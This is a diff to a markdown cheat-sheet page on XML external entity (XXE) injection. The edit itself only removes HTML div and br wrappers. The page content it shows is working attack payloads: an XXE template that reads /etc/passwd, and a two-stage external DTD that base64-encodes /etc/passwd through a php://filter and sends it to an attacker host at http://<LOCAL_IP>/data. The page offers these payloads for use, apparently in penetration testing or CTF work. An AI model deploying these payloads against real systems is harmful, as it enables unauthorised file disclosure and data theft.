@@ -6,8 +6,6 @@ tags: ["xxe", "xml", "dtd", "web"]
 
 ### XXE Template
 
-<div>
-
 ```console
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY data SYSTEM "/etc/passwd">]>
@@ -17,22 +15,14 @@ tags: ["xxe", "xml", "dtd", "web"]
 </product>
 ```
 
-</div>
-
 ### External DTD (2 stage)
-
-<div>
 
 ```console
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://<LOCAL_IP>/data?%data;'>">
 ```
 
-</div>
-
 <br>
-
-<div>
 
 ```console
 <?xml version="1.0" encoding="UTF-8"?>
@@ -46,7 +36,3 @@ tags: ["xxe", "xml", "dtd", "web"]
     <price></price>
 </product>
 ```
-
-</div>
-
-<br>
